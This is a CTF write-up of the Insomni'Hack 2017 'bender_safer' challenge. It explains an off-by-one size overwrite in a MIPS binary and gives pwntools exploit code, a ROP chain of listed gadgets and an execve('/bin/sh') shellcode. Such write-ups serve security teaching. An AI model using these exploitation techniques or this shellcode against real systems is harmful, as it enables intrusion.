+++
title = "Insomni'Hack CTF 2017: bender_safer"
authors = ["hugsy"]
date = 2017-01-26T00:00:00Z
updated = 2017-01-26T00:00:00Z

[taxonomies]
categories = ["ctf"]
tags = ["pwn","linux","insomnihack","mips","stack-overflow","rop","shellcode","keystone"]
+++

[Insomni'Hack CTF 2017](https://web.archive.org/web/20170102081524/https://teaser.insomnihack.ch/) offered a series of 3
challenges (i.e. 3 different flags) on the same binary, called `bender_safe`:

  * `bender_safe` was a Reversing challenge (50 pts) to [discover the correct
    validation sequence](https://web.archive.org/web/20210518073631/https://advancedpersistentjest.com/2017/01/23/writeup-bender_safe-insomnihack-2017-teaser/);
  * `bender_safer` (this one) was a Pwnable challenge (300 pts), which could only be done once
    the first challenge was solved;
  * `bender_safest` was a Shellcoding challenge (150 pts), which could only be
    reached done when the two challenges above were solved. The goal was to
    write a MIPS shellcode to establish a connection to the local port tcp/31337.

Close to the end, only 19 teams (out of 400+) had solved this challenge. I
finished this challenge after the CTF, and since there was no write-up
available, I chose to write one.


### Info ###

The vulnerable file `bender_safe` is a 32-bit MIPS (Big-Endian) binary.

```bash
gef➤  !file ./bender_safe
./bender_safe: ELF 32-bit MSB executable, MIPS, MIPS-II version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=76438e9ed749bcfc6e191e548da153d0d3b3ee28, not stripped
gef➤  checksec
[+] checksec for '/home/user/bender_safer/bender_safe'
Canary                        : No
NX Support                    : No
PIE Support                   : No
No RPATH                      : Yes
No RUNPATH                    : Yes
Partial RelRO                 : No
Full RelRO                    : No
```

No major protection, but I assumed ASLR active and therefore randomizing
the stack (only the stack, as the binary is not PIE).

In addition, some regions were RWX:
```bash
gef➤  vmmap
Start      End        Offset     Perm Path
0x00400000 0x00494000 0x00000000 r-x /home/user/bender_safer/bender_safe
0x004a3000 0x004a8000 0x00093000 rw- /home/user/bender_safer/bender_safe
0x004a8000 0x004cb000 0x00000000 rwx [heap]
0x7ffd6000 0x7fff7000 0x00000000 rwx [stack]
0x7fff7000 0x7fff8000 0x00000000 r-x [vdso]
```



### Vulnerability ###

The binary execution starts where the challenge `bender_safe` left off, with the
OTP validation. We then get into a simple menu offering 3 choices:


```txt
This is Bender's password vault storage
I have 54043195528445952 bytes of memory for storage!
Although 54043195528444928 of which is used to store my fembots videos...HiHiHi!
Your passwords are safe with me meatbag!
|                             |
|  1. View passwords          |
|  2. Enter new passwords     |
|  3. View admin password     |
|  4. Exit                    |
|                             |
```

which we can immediately spot in IDA with the function `enter_vault`. IDA also
gives us a clear indication of the stack layout:

```bash
.text:004017E4 nb_password= -0x414
.text:004017E4 passwords= -0x410
.text:004017E4 choice= -0xC
.text:004017E4 sfp= -8
.text:004017E4 retaddr= -4
```

The `passwords` variable is a 1028 (0x410-0xC) byte array, which is used to
store the passwords. When trying to populate the array (choice #2), the function
`init_passwords` will be hit, and prompt the user for the number of passwords to
store, which must be an integer strictly below 513. `enter_vault` will
store the number of passwords to store in 2 locations, a dedicated variable
(@ebp-0x414), but also as the first value of the array `passwords`
(i.e. `passwords[0]`, @ebp-0x410). The number of passwords is used as a counter for a loop
that will read the passwords from stdin, thanks to the `read_passwords` function.

{{ img(src="https://i.imgur.com/7UfE0bU.png" title="image_alt") }}

After spending way too long spent trying to check for an arithmetic mistake, I
reviewed more thoroughly the function `read_passwords`.

The function `read_passwords` takes two arguments, a pointer to a buffer and a
integer, which corresponds to the size of data to read. The buffer is populated
one character at a time, in the following loop:

{{ img(src="https://i.imgur.com/OYLowAm.png" title="image_alt") }}

The interesting bit starts around 0x401640: when a `\n` character is provided to
fill the byte at offset `i` (i.e. `buffer[i]`), the function performs an additional
check to test if the preceding character (i.e. `buffer[i-1]`) was
`\r` and if so replace it with `\n`. And the vulnerability (as subtle as it is)
is here: when overwriting the byte, the function does not check that
`i>0`. Because we are on big endian architecture, this can lead to size
overwrite. To do so, we need to

   * Specify a number of passwords of `ord('\r')` (or 13);
   * The application will reply that we can store 13 passwords of 76 bytes;
   * Enter a first password with only `\n`

This will overwrite the number of passwords stored in `passwords[0]` to 10,
allowing us to write 12 passwords of 102 bytes (i.e. 1224 bytes), which results
in a stack overflow.

The vulnerability can  be asserted by setting a breakpoint before and after
the first call to `read_passwords`.


```bash
gef➤  b *0x004019BC
Breakpoint 1 at 0x4019bc
gef➤  r
[...]
|                             |
|  1. View passwords          |
|  2. Enter new passwords     |
|  3. View admin password     |
|  4. Exit                    |
|                             |
2
How many passwords do you want to store? : 13
You can store 13 passwords of 76 length, enjoy!
Enter your passwords, one per line

Breakpoint 1, 0x004019bc in enter_vault ()
gef➤  p/x $a0-4
0x7fff62d8
gef➤  x/x 0x7fff62d8
0x7fff62d8:     0x0000000d   # << current size, before the call to read_passwords(
gef➤  advance *0x004019c4
                             # << enter an empty first password (only \n)
gef➤  x/x 0x7fff62d8
0x7fff62d8:     0x0000000a   # << new size, after the call
```

And if we populate the 12 remaining passwords with "A"*102 the return address
(`$ra` register) gets corrupted, which we can observe by taking the exit:

{{ img(src="https://i.imgur.com/INggKTu.png" title="image_alt") }}


### Exploitation ###


#### Controlling $pc ####

So we are now able to make the program crash. To know the exact offset of `$pc`,
I've used the De Bruijn pattern from `gef` and `pwntools`.

```python
if __name__ == "__main__":
    HOST, PORT = "localhost", 12234
    r = remote(HOST, PORT)
    r.recvuntil("Here's your OTP challenge : \n")
    chal = r.readline().strip()
    resp = validate(chal)
    r.sendline(resp)

    log.info("poisoing buf[-1] with \\r")
    r.sendline("2")
    r.recvuntil('How many passwords do you want to store? : ')
    l = 13 # \r
    r.sendline(str(l))
    r.recvline()
    r.recvline()
    r.send('\n') # this will force passwords[0] to be overwritten with 0xA, making the password size length wrong

    log.info("filling up the stack")
    raw_input("attach to gdb now...")
    pattern = cyclic(2000, n=4)
    for i in range(12):
        r.send(pattern[i*102:i*102+102])

    r.interactive()
```

And we now know that the PC is controlled at offset 921, as we are on a Big
Endian architecture:

{{ img(src="https://i.imgur.com/NYLt8XQ.png" title="image_alt") }}


#### ROP-ing to a fixed area ####


So great, we can control `$ra`, and therefore call any location. But the MIPS ABI
uses registers (from `$a0` to `$a3`) to store parameters of function
calls so we need to control (at least some of) them.

To achieve code execution, I decided to reach control only of `$a0` and `$a1`,
which is then sufficient to call `read_passwords(buffer, length)`, and have a
shellcode copied into one of the fixed RWX location.

After seeing too many ROP tools for MIPS fail, I simply used `objdump -D` to
find the following gadgets:

  * 0x00403ba4: Control `$s2` from a value given from the stack
```bash
.text:00403BA4 lw      $ra, 0x28+var_4($sp)
.text:00403BA8 lw      $s2, 0x28+var_8($sp)
.text:00403BAC lw      $s1, 0x28+var_C($sp)
.text:00403BB0 lw      $s0, 0x28+var_10($sp)
.text:00403BB4 jr      $ra
```

  * 0x403bbc: Use `$s2` to control `$v0`
```bash
.text:00403BBC lw      $ra, 0x28+var_4($sp)
.text:00403BC0 move    $v0, $s2
.text:00403BC4 lw      $s1, 0x28+var_C($sp)
.text:00403BC8 lw      $s2, 0x28+var_8($sp)
.text:00403BCC lw      $s0, 0x28+var_10($sp)
.text:00403BD0 jr      $ra
```

  * 0x00403b98: Use `$v0` to control `$a0`
```bash
.text:00403B98 move    $a0, $v0
.text:00403B9C bnez    $s0, loc_403B7C
.text:00403BA0 move    $a1, $zero
```

  * By re-using gadget@0x00403ba4 with 0x004038e8, we use `$s2` to control `$a1`
```bash
.text:004038E8 move    $a1, $s2
.text:004038EC lw      $ra, 0x30+var_4($sp)
.text:004038F0 lw      $s4, 0x30+var_8($sp)
.text:004038F4 lw      $s3, 0x30+var_C($sp)
.text:004038F8 lw      $s2, 0x30+var_10($sp)
.text:004038FC lw      $s1, 0x30+var_14($sp)
.text:00403900 lw      $s0, 0x30+var_18($sp)
.text:00403904 sltiu   $v0, 1
.text:00403908 jr      $ra
```

We can chain those 4 gadgets to entirely control `$a0` and `$a1` and then call
`read_passwords` to write a `execve('/bin/sh')` shellcode into one of fixed RWX pages (I've
chosen 0x004a8a00).


```python
log.info("preparing ropchain")
sfp = p32(0x004a8000)
set_s2 = p32(0x403BA4)
set_v0 = p32(0x403BBC)
set_a0 = p32(0x403B98)
set_a1 = p32(0x4038e8)
read_passwords = p32(0x004015E8)
a0 = p32(0x004a8a00)
a1 = p32(0x100)
p = 'YOLO'*2 + sfp
p+= set_s2 + 'YOLO'*8 + a0 + set_v0 + p32(0)*9 + set_a0 + "YOLO"*8 + 'ZZZ'
p+= set_s2 + 'YOLO'*8 + a1 + set_a1 + 'YOLO'*10 + 'Z'*3
p+= read_passwords + "YOLO"*9 + p32(0x4a8a00)
payload = p.ljust(303, "Z")
r.send(payload[:102])
r.send(payload[102:204])
r.send(payload[204:])
```


#### Shellcode crafting ####

For some reasons, the different shellcodes I had from external resources did not
work. So I decided to use [Keystone Engine](http://www.keystone-engine.org) to
write one. Instead of writing totally from scratch, I used a template created
earlier as part of my project
[`cemu`](https://github.com/hugsy/cemu/blob/main/cemu/examples/mipsbe_sys_exec_bin_sh.asm)
 and adapted it:

```python
log.info("preparing shellcode")
shellcode = [
  "li $sp, 0x4a8b00",
  "li $v0, 0x2f62696e",
  "sw $v0, 0($sp)",
  "li $v0, 0x2f736800",
  "sw $v0, 4($sp)",
  "li $v0, 4011",
  "move $a0, $sp",
  "addiu $a1, $zero, 0",
  "addiu $a2, $zero, 0",
  "syscall",
]

arch, mode, endian = keystone.KS_ARCH_MIPS, keystone.KS_MODE_MIPS32, keystone.KS_MODE_BIG_ENDIAN
ks = keystone.Ks(arch, mode | endian)
sc, cnt = ks.asm(shellcode)
log.info("keystone compiled %d instructions" % cnt)
sc = "".join([chr(x) for x in sc])
r.send(sc)
```

>
> **Update**: as {{ twitter(user="0xGrimmlin](https://twitter.com/0xGrimmlin) [mentioned") }}, during the CTF,
> the challenge was actually QEMU chroot-ed, so technically this shellcode would
> not have worked, but you could similarly build another one doing
> open/read/write(stdout)
>

#### Fire ####

We have now all the components to launch our exploit. The final version is
available
[here](https://gist.github.com/hugsy/3e64b7cae4de38ba153a23e5491bff24).

{{ img(src="https://i.imgur.com/VJgWcia.png" title="image_alt22") }}


### Conclusion ###

This is it... Well not really. The ultimate challenge was to craft a shellcode
to connect to tcp/31337. But the way we used to solve this challenge in the last
sections of this blog post makes it trivial to extend (by simply establishing a
TCP connection) and solve the final challenge. I
will leave this to the reader's curiosity  ☺

I will just conclude this post by thanking
the [Insomni'hack](https://insomnihack.ch) team for putting up together such fun
and original challenges. And also, huge congratulations 🥂 to the few teams who scored this
challenge during the CTF.

Hope you enjoyed this article, and see you next time for more challenges...
